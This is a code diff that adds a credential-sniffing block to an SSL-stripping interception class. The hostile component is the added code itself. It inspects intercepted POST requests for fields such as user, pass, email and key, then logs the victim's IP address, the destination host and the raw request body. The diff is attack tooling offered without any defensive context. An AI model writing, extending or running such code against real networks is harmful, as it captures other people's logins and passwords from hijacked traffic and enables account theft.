@@ -75,6 +75,41 @@ class SSLStripFilter:
         if not (b"GET " in payload or b"POST " in payload):
             return False
 
+        # --- CREDENTIAL SNIFFING ---
+        if b"POST " in payload:
+            try:
+                lower_payload = payload.lower()
+                keywords = [b"user", b"name", b"login", b"pass", b"email", b"usr", b"pwd", b"key"]
+                
+                # Check for keywords in simple URL encoded or JSON format
+                found_cred = False
+                for k in keywords:
+                    if k + b"=" in lower_payload or k + b'":' in lower_payload:
+                        found_cred = True
+                        break
+                
+                if found_cred:
+                    self.logger(f"\n[!] POTENTIAL CREDENTIALS FOUND from {ip.src}")
+                    decoded = payload.decode('utf-8', errors='ignore')
+                    
+                    # Extract Body
+                    if "\r\n\r\n" in decoded:
+                        headers, body = decoded.split("\r\n\r\n", 1)
+                        # Find Host
+                        host = "Unknown"
+                        for line in headers.splitlines():
+                            if line.lower().startswith("host:"):
+                                host = line.split(":", 1)[1].strip()
+                        
+                        self.logger(f"    Target: {host}")
+                        self.logger(f"    Data:   {body.strip()[:500]}") # Limit length
+                    else:
+                        self.logger(f"    Raw: {decoded[:200]}")
+                    self.logger("-" * 40 + "\n")
+            except Exception as e:
+                self.logger(f"[Sniff Error] {e}")
+        # ---------------------------
+
         self.processed_requests.add(request_id)
         self.logger(f"[SSLFilter] Intercepting HTTP Request on port {tcp.sport}")
         self.hijacked_ports.add(tcp.sport)
